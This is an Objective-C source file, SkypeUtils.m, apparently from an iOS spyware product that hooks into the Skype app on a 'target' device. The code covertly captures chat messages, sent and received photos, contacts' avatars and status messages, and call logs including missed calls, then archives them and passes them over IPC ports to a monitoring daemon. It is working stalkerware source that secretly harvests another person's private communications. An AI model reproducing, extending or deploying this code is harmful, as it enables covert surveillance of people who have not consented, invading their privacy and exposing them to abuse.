//
//  SkypeUtils.m
//  MSFSP
//
//  Created by Makara Khloth on 12/7/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "SkypeUtils.h"
#import "DomainObjectPool.h"
#import "SKMessage+Skype48.h"
#import "SKMessage.h"
#import "SKTransferMessage.h"
#import "SKConversation.h"
#import "SKAccount.h"
#import "SKParticipant.h"
#import "SKAccountManager.h"
#import "SKContact.h"
#import "SKImageScaler.h"

#import "DefStd.h"
#import "DaemonPrivateHome.h"
#import "MessagePortIPCSender.h"
#import "SharedFile2IPCSender.h"
#import "DMCenterIPCSender.h"
#import "StringUtils.h"
#import "FxIMEvent.h"
#import "FxAttachment.h"
#import "FxVoIPEvent.h"
#import "FxRecipient.h"
#import "DateTimeFormat.h"

#import "SKPMessage.h"
#import "SKPCallEventMessage.h"

#import <objc/runtime.h>

static SkypeUtils *_SkypeUtils = nil;

@interface SkypeUtils (private)
- (void) thread: (FxIMEvent *) aIMEvent;					// for IM event
- (void) voIPthread: (FxVoIPEvent *) aVoIPEvent;			// for VoIP event
+ (BOOL) sendDataToPort: (NSData *) aData portName: (NSString *) aPortName;
- (void) deleteAttachmentFileAtPathForEvent: (NSArray *) aAttachmentArray;
- (void) fileTransferInitiatedNotification: (NSNotification *) aNotification;
- (void) capturePhotoAttachmentMessage: (SKMessage *) aMessage
				   withTransferMessage: (SKTransferMessage *) aTransferMessage
					  withConversation: (SKConversation *) aConversation;
@end


@implementation SkypeUtils

@synthesize mLastSKMessage, mConversationLists, mDomainObjectPool;
@synthesize mIMSharedFileSender, mVOIPSharedFileSender;

+ (SkypeUtils *) sharedSkypeUtils {
	if (_SkypeUtils == nil) {
		_SkypeUtils = [[SkypeUtils alloc] init];					
		[_SkypeUtils setMLastSKMessage:nil];
		
		if ([[[UIDevice currentDevice] systemVersion] intValue] >= 7) {
			SharedFile2IPCSender *sharedFileSender = nil;
			
			sharedFileSender = [[SharedFile2IPCSender alloc] initWithSharedFileName:kSkypeMessagePort1];
			[_SkypeUtils setMIMSharedFileSender:sharedFileSender];
			[sharedFileSender release];
			sharedFileSender = nil;
			
			sharedFileSender = [[SharedFile2IPCSender alloc] initWithSharedFileName:kSkypeCallLogMessagePort1];
			[_SkypeUtils setMVOIPSharedFileSender:sharedFileSender];
			[sharedFileSender release];
			sharedFileSender = nil;
		}
	}
	return (_SkypeUtils);		
}

+ (void) sendSkypeEvent: (FxIMEvent *) aIMEvent {
	SkypeUtils *skypeUtils = [[SkypeUtils alloc] init];
	[NSThread detachNewThreadSelector:@selector(thread:)
							 toTarget:skypeUtils withObject:aIMEvent];
	[skypeUtils autorelease];
}

- (void) capturePhotoAttachment {
	NSNotificationCenter *nc = [NSNotificationCenter defaultCenter];
	[nc addObserver:_SkypeUtils
		   selector:@selector(fileTransferInitiatedNotification:)
			   name:@"ConversationFileTransferInitiatedNotification"
			 object:nil];
}

- (void) thread: (FxIMEvent *) aIMEvent {
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	@try {
		NSString *msg = [StringUtils removePrivateUnicodeSymbols:[aIMEvent mMessage]];
		DLog(@"Skype message after remove emoji = %@", msg);
		if ([msg length] || [[aIMEvent mAttachments] count]) {
            
            DLog(@"skype message %@", aIMEvent)
			[aIMEvent setMMessage:msg];
			
			NSMutableData* data = [[NSMutableData alloc] init];
			NSKeyedArchiver *archiver = [[NSKeyedArchiver alloc] initForWritingWithMutableData:data];
			NSString *bundleIdentifier = [[NSBundle mainBundle] bundleIdentifier];
			NSDictionary *skypeInfo = [[NSDictionary alloc] initWithObjectsAndKeys:bundleIdentifier, @"bundle",
																				   aIMEvent, @"IMEvent", nil];
			[archiver encodeObject:skypeInfo forKey:kSkypeArchived];
			[archiver finishEncoding];
			[skypeInfo release];
			[archiver release];	
			
			// -- first port ----------
			BOOL sendSuccess = [SkypeUtils sendDataToPort:data portName:kSkypeMessagePort1];
			if (!sendSuccess){
				DLog (@"First attempt fails %@", [aIMEvent mMessage])
				
				// -- second port ----------
				sendSuccess = [SkypeUtils sendDataToPort:data portName:kSkypeMessagePort2];
				if (!sendSuccess) {
					DLog (@"Second attempt fails %@", [aIMEvent mMessage])
					
					[NSThread sleepForTimeInterval:1];
					
					// -- Third port ----------				
					sendSuccess = [SkypeUtils sendDataToPort:data portName:kSkypeMessagePort3];					
					if (!sendSuccess) {
						DLog (@"Third attempt fails %@", [aIMEvent mMessage])
						[self deleteAttachmentFileAtPathForEvent:[aIMEvent mAttachments]];
					}
				}
				
			}
			
			[data release];
		}
	}
	@catch (NSException * e) {
		;
	}
	@finally {
		;
	}
	[pool release];
}

+ (BOOL) sendDataToPort: (NSData *) aData portName: (NSString *) aPortName {
	BOOL successfully = FALSE;
	if ([[[UIDevice currentDevice] systemVersion] intValue] <= 6) {
		MessagePortIPCSender* messagePortSender = [[MessagePortIPCSender alloc] initWithPortName:aPortName];
		successfully = [messagePortSender writeDataToPort:aData];
		[messagePortSender release];
		messagePortSender = nil;
	} else {
		SharedFile2IPCSender *sharedFileSender = nil;
		if ([aPortName isEqualToString:kSkypeMessagePort1]	||
			[aPortName isEqualToString:kSkypeMessagePort2]	||
			[aPortName isEqualToString:kSkypeMessagePort3]	) {
			sharedFileSender = [[SkypeUtils sharedSkypeUtils] mIMSharedFileSender];
		} else {
			sharedFileSender = [[SkypeUtils sharedSkypeUtils] mVOIPSharedFileSender];
		}
		successfully = [sharedFileSender writeDataToSharedFile:aData];
	}
	
	return (successfully);
}

- (void) deleteAttachmentFileAtPathForEvent: (NSArray *) aAttachmentArray  {
	for(int i=0; i<[aAttachmentArray count]; i++){
		FxAttachment *attachment = (FxAttachment *)[aAttachmentArray objectAtIndex:i];
		NSString *path = [attachment fullPath];
		BOOL deletesuccess = [[NSFileManager defaultManager] removeItemAtPath:path error:nil];
		if (deletesuccess){
			DLog (@"Deleting file %@",path );
		} else {
			DLog (@"Fail deleting file %@",path );
		}
	}
}

- (void) fileTransferInitiatedNotification: (NSNotification *) aNotification {
	DLog (@"aNotification = %@", aNotification);
	
	NSDictionary *userInfo = [aNotification userInfo];
	NSNumber *conversationObjectID = [userInfo objectForKey:@"conversationObjectID"];
	NSNumber *messageObjectID = [userInfo objectForKey:@"messageObjectID"];
	NSNumber *transferObjectID = [userInfo objectForKey:@"transferObjectID"];

	Class $SKMessage = objc_getClass("SKMessage");
	Class $SKTransferMessage = objc_getClass("SKTransferMessage");
	Class $SKConversation = objc_getClass("SKConversation");
	DomainObjectPool *objectsPool = [self mDomainObjectPool];
	SKMessage *message = [objectsPool objectWithClass:$SKMessage skyLibObjectID:messageObjectID];
	SKTransferMessage *transferMessage = [objectsPool objectWithClass:$SKTransferMessage skyLibObjectID:transferObjectID];
	SKConversation *conversation = [objectsPool objectWithClass:$SKConversation	skyLibObjectID:conversationObjectID];
	
	DLog (@"objectsPool		= %@", objectsPool);
	DLog (@"message			= %@", message);
	DLog (@"transferMessage = %@", transferMessage);
	DLog (@"conversation	= %@", conversation);
	
	if ([message isOutbound]) {
		DLog (@"Outgoing photo attachment (Skype 4.9 onward..)");
		[self capturePhotoAttachmentMessage:message
						withTransferMessage:transferMessage
						   withConversation:conversation];
	}
}

- (void) capturePhotoAttachmentMessage: (SKMessage *) aMessage
				   withTransferMessage: (SKTransferMessage *) aTransferMessage
					  withConversation: (SKConversation *) aConversation {
	SKConversation *conversation = aConversation;
	SKMessage *msgObj = aMessage;
	
	//NSString *message = [msgObj body];
	NSString *message = @"";
	NSString *userId = [msgObj identity];
	NSString *userDisplayName = [msgObj authorDisplayName];
	NSString *imServiceId = @"skp";
	NSString *senderStatusMessage = nil;
	NSData *senderPictureData	= nil;
	
	// Direction
	int direction = kEventDirectionUnknown;
	if ([msgObj isOutbound]) {
		direction = kEventDirectionOut;
	} else {
		direction = kEventDirectionIn;
	}
	// Participants: Skype store everyone in conversation
	NSArray *origParticipants = [conversation participants];
	DLog (@"origParticipants %@", origParticipants)
	
	NSMutableArray *tempParticipants = [origParticipants mutableCopy];
	// Remove sender from participants list
	for (int i=0; i < [origParticipants count]; i++) {
		if ([[((SKParticipant *)[origParticipants objectAtIndex:i]) identity] isEqualToString:userId]) {
			// -- get sender's status message
			SKContact *contact = [((SKParticipant *)[origParticipants objectAtIndex:i]) contact];
			senderStatusMessage = [contact moodMessage];			
			senderPictureData = [contact avatarImageData];
			DLog (@"senderPictureData %d", [senderPictureData length])
			//[senderPictureData writeToFile:@"/tmp/skypeImageIn.jpg" atomically:YES];
			[tempParticipants removeObjectAtIndex:i];
			break;
		}
	}
	
	Class $SKAccountManager		= objc_getClass("SKAccountManager");
	SKAccount *currentAccount	= [[$SKAccountManager sharedManager] currentAccount];	// SKAccount
	DLog (@"account identity %@", [currentAccount identity])
	
	// Map to FxRecipient array
	NSMutableArray *finalParticipants = [NSMutableArray array];
	for (SKParticipant *obj in tempParticipants) {
		FxRecipient *participant = [[FxRecipient alloc] init];
		[participant setRecipNumAddr:[obj identity]];
		[participant setRecipContactName:[obj displayName]];
		[participant setMStatusMessage:[(SKContact *)[obj contact] moodMessage]];
		DLog (@">>> CONTACT PICTURE: %d", [[[obj contact] avatarImageData] length])
		[participant setMPicture:[[obj contact] avatarImageData]];	
		DLog (@"> participant status message (%@):  %@", [[obj contact] displayName], [[obj contact] moodMessage])
		//DLog (@"> participant picture   %d", [[[obj contact] avatarImageData] length])
		//[[[obj contact] avatarImageData] writeToFile:getOutputPath() atomically:YES];
		
		if ([[obj identity] isEqualToString:[(SKAccount *)currentAccount identity]]) {		// target									
			DLog (@"target so insert at 1st index")
			[finalParticipants insertObject:participant	atIndex:0];
			
		} else {																			// not target
			[finalParticipants addObject:participant];				
		}			
		[participant release];
	}
	[tempParticipants release];
	
	DLog(@"mDirection->%d", direction);
	DLog(@"mUserID->%@", userId);
	DLog(@"mUserDisplayName->%@", userDisplayName);
	DLog(@"mParticipants->%@", finalParticipants);
	DLog(@"mIMServiceID->%@", imServiceId);
	DLog(@"mMessage->%@", message);
	DLog(@"mAttachments->%d", [msgObj isChatMessage]);
	DLog (@"converstion displayName = %@", [conversation displayName]);
	DLog (@"conversationIdentifier = %@", [conversation conversationIdentifier])
	
	NSString *skypeAttachmentPath = [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"attachments/imSkype/"];
	NSString *saveFilePath = [skypeAttachmentPath stringByAppendingString:[[msgObj transferMessage] filename]];
	NSString *originpath = [[msgObj transferMessage] pathname];
	NSError *error = nil;
	NSFileManager *fileManager = [NSFileManager defaultManager];
	DLog(@"File is exist = %d", [fileManager fileExistsAtPath:originpath]);
	if ([fileManager fileExistsAtPath:originpath]) {
		[fileManager removeItemAtPath:saveFilePath error:&error];
		DLog (@"Remove file error = %@", error);
		error = nil;
		[fileManager copyItemAtPath:originpath toPath:saveFilePath error:&error];
		DLog (@"Copy file error = %@", error);
	}
	
	// Attachment...
	FxAttachment *attachment = [[FxAttachment alloc] init];
	[attachment setFullPath:saveFilePath];
	if (direction == kEventDirectionOut) {
		NSString *thumbnailPath = [[[msgObj transferMessage] pathname] stringByDeletingPathExtension];
		thumbnailPath = [thumbnailPath stringByAppendingString:@"-thumb.jpg"];
		[attachment setMThumbnail:[NSData dataWithContentsOfFile:thumbnailPath]];
	} else if (direction == kEventDirectionIn) {
		NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
		UIImage *image = [UIImage imageWithContentsOfFile:[[msgObj transferMessage] pathname]];
		Class $SKImageScaler = objc_getClass("SKImageScaler");
		UIImage *thumbnailImage = [$SKImageScaler scaleImage:image toFillTargetSize:CGSizeMake(600,600)];
		[attachment setMThumbnail:UIImageJPEGRepresentation(thumbnailImage, 1.0)];
		[pool release];
	}
	
	FxIMEvent *imEvent = [[FxIMEvent alloc] init];
	[imEvent setMUserID:userId];
	[imEvent setMIMServiceID:imServiceId];
	[imEvent setMDirection:(FxEventDirection)direction];
	[imEvent setMMessage:message];
	[imEvent setMUserDisplayName:userDisplayName];		
	[imEvent setMParticipants:finalParticipants];
	[imEvent setMAttachments:[NSArray arrayWithObject:attachment]];
	[imEvent setDateTime:[DateTimeFormat phoenixDateTime]];
	// new
	[imEvent setMServiceID:kIMServiceSkype];						
	[imEvent setMRepresentationOfMessage:kIMMessageNone];		// photo message			
	[imEvent setMConversationID:[conversation conversationIdentifier]];
	[imEvent setMConversationName:[conversation displayName]];
	[imEvent setMUserStatusMessage:senderStatusMessage];		// sender status message
	[imEvent setMUserPicture:senderPictureData];				// sender image profile
	[imEvent setMConversationPicture:nil];
	[imEvent setMUserLocation:nil];
	[imEvent setMShareLocation:nil];
	
	[SkypeUtils sendSkypeEvent:imEvent];
	[attachment release];
	[imEvent release];
}

+ (BOOL) isMissVoIPCall: (FxEventDirection) aDirection
				message: (SKMessage *) aMessage {
	BOOL isMissCall = NO;	
	// -- check miss call (INCOMING)
	if (aDirection == kEventDirectionIn) {
		/* -- for miss call, we can check with 2 ways
		 1) Duration is 0
		 However, the duration can be 0 if the target device accepts the call, and then the 3rd party device ends the call immediately
		 
		 2) arguement of SKMessage		 
			CASE 1: the incoming call is rejected by the target device
				isDeclinedInboundCall = 1
			CASE 2: the incoming call is ignored by the target device until it's ended
				isMissed = 1 and isMissedCall = 1				
		 */
		if ([aMessage isDeclinedInboundCall]	||					// reject the incoming call
			[aMessage isMissed]					){						// ignore the incoming call			
			isMissCall = YES;
		}							
	}
	return isMissCall;	
}


#pragma mark VoIP (public method)


+ (FxVoIPEvent *) createSkypeVoIPEventForMessage: (SKMessage *) aMessage
									   direction: (FxEventDirection) aDirection
									   recipient: (FxRecipient *) aRecipient {
	DLog (@"create Skype VoIP")
	NSString *recipientVoIPID			= nil;
	NSString *recipientVoIPDisplayName	= nil;		
	if (aDirection == kEventDirectionOut) {
		recipientVoIPID					= [aRecipient recipNumAddr];
		recipientVoIPDisplayName		= [aRecipient recipContactName];		
	} else {
		recipientVoIPID					= [(SKContact *)[aMessage contact] identity];
		recipientVoIPDisplayName		= [(SKContact *)[aMessage contact] displayName];	
	}										
	
	// -- create FxVoIPEvent
	FxVoIPEvent *skypeVoIPEvent	= [[FxVoIPEvent alloc] init];	
	[skypeVoIPEvent setDateTime:[DateTimeFormat phoenixDateTime]];
	[skypeVoIPEvent setEventType:kEventTypeVoIP];															
	[skypeVoIPEvent setMCategory:kVoIPCategorySkype];	
	[skypeVoIPEvent setMDirection:(FxEventDirection) aDirection];				
	if ([SkypeUtils isMissVoIPCall:aDirection message:aMessage])				
		[skypeVoIPEvent setMDirection:kEventDirectionMissedCall];			// MISS CALL	
	[skypeVoIPEvent setMDuration:(NSUInteger)[aMessage duration]];			
	[skypeVoIPEvent setMUserID:recipientVoIPID];						// participant id 
	[skypeVoIPEvent setMContactName:recipientVoIPDisplayName];			// participant displayname
	[skypeVoIPEvent setMTransferedByte:0];
	[skypeVoIPEvent setMVoIPMonitor:kFxVoIPMonitorNO];
	[skypeVoIPEvent setMFrameStripID:0];																
	
	DLog (@">>>> Skype VOIP Event %@", skypeVoIPEvent)
	return [skypeVoIPEvent autorelease];
}

// Capture VOIP for Skype version 5.x
+ (FxVoIPEvent *) createSkypeVoIPEventForMessagev2: (SKPCallEventMessage *) aMessage
                                         direction: (FxEventDirection) aDirection
                                         recipient: (FxRecipient *) aRecipient {

	DLog (@"create Skype VoIP")
	NSString *recipientVoIPID                   = nil;
	NSString *recipientVoIPDisplayName          = nil;
    
    FxVoIPEvent *skypeVoIPEvent                 = nil;
    recipientVoIPID                             = [aRecipient recipNumAddr];
    recipientVoIPDisplayName                    = [aRecipient recipContactName];
    
    // -- create FxVoIPEvent
    skypeVoIPEvent                              = [[FxVoIPEvent alloc] init];
    [skypeVoIPEvent setDateTime:[DateTimeFormat phoenixDateTime]];
    [skypeVoIPEvent setEventType:kEventTypeVoIP];
    [skypeVoIPEvent setMCategory:kVoIPCategorySkype];
    [skypeVoIPEvent setMDirection:(FxEventDirection) aDirection];
    [skypeVoIPEvent setMDuration:(NSUInteger)[aMessage duration]];
    if ([[aMessage prettyEventType] isEqualToString:@"Missed"]) {
        [skypeVoIPEvent setMDirection:kEventDirectionMissedCall];   // MISS CALL
        [skypeVoIPEvent setMDuration:0];                            // For miss call the value of duration that has been set is invalid e.g., 2147483647
    }
    [skypeVoIPEvent setMUserID:recipientVoIPID];                    // participant id
    [skypeVoIPEvent setMContactName:recipientVoIPDisplayName];      // participant displayname
    [skypeVoIPEvent setMTransferedByte:0];
    [skypeVoIPEvent setMVoIPMonitor:kFxVoIPMonitorNO];
    [skypeVoIPEvent setMFrameStripID:0];
		
	DLog (@">>>> Skype VOIP Event %@", skypeVoIPEvent)
	return [skypeVoIPEvent autorelease];
}


+ (void) sendSkypeVoIPEvent: (FxVoIPEvent *) aVoIPEvent {
	SkypeUtils *skypeUtils = [[SkypeUtils alloc] init];
	[NSThread detachNewThreadSelector:@selector(voIPthread:)
							 toTarget:skypeUtils withObject:aVoIPEvent];
	[skypeUtils autorelease];
}


#pragma mark VoIP (private method)


- (void) voIPthread: (FxVoIPEvent *) aVoIPEvent {
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	@try {
		
		NSMutableData* data			= [[NSMutableData alloc] init];
		NSKeyedArchiver *archiver	= [[NSKeyedArchiver alloc] initForWritingWithMutableData:data];
		NSString *bundleIdentifier	= [[NSBundle mainBundle] bundleIdentifier];
		NSDictionary *skypeInfo		= [[NSDictionary alloc] initWithObjectsAndKeys:bundleIdentifier, @"bundle",
									   aVoIPEvent, @"VoIPEvent", nil];
		[archiver encodeObject:skypeInfo forKey:kSkypeArchived];
		[archiver finishEncoding];
		[skypeInfo release];
		[archiver release];	
		
		// -- first port ----------
		BOOL sendSuccess = [SkypeUtils sendDataToPort:data portName:kSkypeCallLogMessagePort1];
		if (!sendSuccess){
			DLog (@"First attempt fails %@", aVoIPEvent)
			
			// -- second port ----------
			sendSuccess = [SkypeUtils sendDataToPort:data portName:kSkypeCallLogMessagePort2];
			if (!sendSuccess) {
				DLog (@"Second attempt fails %@", aVoIPEvent)
				
				[NSThread sleepForTimeInterval:1];
				
				// -- Third port ----------				
				sendSuccess = [SkypeUtils sendDataToPort:data portName:kSkypeCallLogMessagePort3];	
				if (!sendSuccess) {
					DLog (@"LOST Skype VoIP event %@", aVoIPEvent)
				}
			}
		}			
		[data release];
	}
	@catch (NSException * e) {
		;
	}
	@finally {
		;
	}
	[pool release];
}

- (void) dealloc {
	NSNotificationCenter *nc = [NSNotificationCenter defaultCenter];
	[nc removeObserver:self
				  name:@"ConversationFileTransferInitiatedNotification"
				object:nil];
	[mDomainObjectPool release];
	[mLastSKMessage release];
	[mIMSharedFileSender release];
	[mVOIPSharedFileSender release];
	[mConversationLists release];
	_SkypeUtils = nil;
	[super dealloc];
}

@end
